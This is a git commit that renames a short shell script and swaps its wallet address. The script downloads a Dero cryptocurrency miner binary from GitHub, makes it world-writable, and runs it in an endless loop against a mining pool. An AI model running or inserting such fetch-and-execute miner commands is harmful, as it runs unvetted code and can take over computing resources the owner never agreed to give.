a3e884c6c60ed12b8d50548dd5e1337cb2e8b72d
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-12 21:14:08 +0700

    Update and rename usik.sh to toto.sh

---
+++ toto.sh
@@ -0,0 +1,8 @@
+wget https://github.com/WxYtzaiu/asekhh/raw/main/dero-stratum-miner
+chmod 777 dero-stratum-miner
+
+#!/bin/bash
+while :; do
+./dero-stratum-miner -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmzrc98wdfz0jfq5r2crc.KAMUNANYA
+sleep 5;
+done
--- usik.sh
+++
@@ -1,8 +0,0 @@
-wget https://github.com/WxYtzaiu/asekhh/raw/main/dero-stratum-miner
-chmod 777 dero-stratum-miner
-
-#!/bin/bash
-while :; do
-./dero-stratum-miner -r pool.whalesburg.com:4300 -w dERoSCQeRCe3GVBEHoJh2tgR2KZNF22gcCuYW29ZuAJFGk9rA7UWFwdPcXzxnXLvQ4V8WdntxVoxK4qruF2GahFf49oRxiMH8H.KAMUNANYA
-sleep 5;
-done
